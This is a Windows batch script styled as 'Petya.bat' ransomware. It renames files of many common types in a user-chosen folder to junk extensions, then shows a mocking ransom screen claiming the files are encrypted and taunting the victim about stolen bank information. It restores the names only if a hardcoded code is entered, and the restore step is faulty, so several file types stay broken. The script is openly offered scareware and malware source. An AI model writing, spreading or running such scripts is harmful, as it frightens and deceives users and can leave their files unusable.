@echo off
cls
echo Please find a specific location to run this program
set /p encryptLocation=Location :
cls
cd %encryptLocation%
ren *.exe *.ssssssss
ren *.bat *.aaaaaaaa
ren *.zip *.eeeeeeee
ren *.txt *.qqqqqqqq
ren *.pdf *.wwwwwwww
ren *.jpg *.gggggggg
ren *.gif *.oooooooo
ren *.doc *.llllllll
ren *.xls *.pppppppp
ren *.vcf *.vvvvvvvv
ren *.pptx *.ffffffff
ren *.key *.llllllll
ren *.rar *.bbbbbbbb
ren *.iso *.0101010101
ren *.msi *.1111111111
ren *.partial *.44444444
 
cls
color f4
echo Petya.bat                                    perusian company
echo ================================================================================
echo Your files have been encrypted. 
echo Don't close this window or you won't get them back
echo You know what to do? Enter the decryption code below to recover them. HAHAHAHAHA
echo ================================================================================
set /p questionbeforedecrypt=Hi. Enter decryption code (ATT 1/3)
if "%questionbeforedecrypt%"=="dead" goto decryption
set /p att2=This is not a joke. Rally. Enter decryption code (ATT 2/3)
if "%att2%"=="dead" goto decryption
set /p att3last= This is a last ATT!!!!
if "%att3last%"=="dead" goto decryption
msg * RIP PC. THX FOR BANKINFO :DDD ~ The word of perusian Company.
cd %encryptLocation%
echo%1 echo off&cls&color f4&echo All of your data weren`t recoverable

:decryption
cd %encryptLocation%
ren *.ssssssss *.exe
ren *.aaaaaaaa *.bat
ren *.eeeeeeee *.zip
ren *.qqqqqqqq *.txt
ren *.wwwwwwww *.pdf
ren *.gggggggg *.jpg
ren *.oooooooo *.gif
ren *.lllllllk *.doc
ren *.pppppppp *.xls
ren *.vvvvvvvv *.vcf
ren *.ffffffff *.pptx
ren *.llllllll *.key
echo X=msgbox("THANK YOU FOR HELPING US Petya.bat!!!!! WE DECRYPT SOME YOUR FILE. BUT SORRY SOME FILES CANNOT BE DECRYPTED BUT EXTENSIONS THEM")
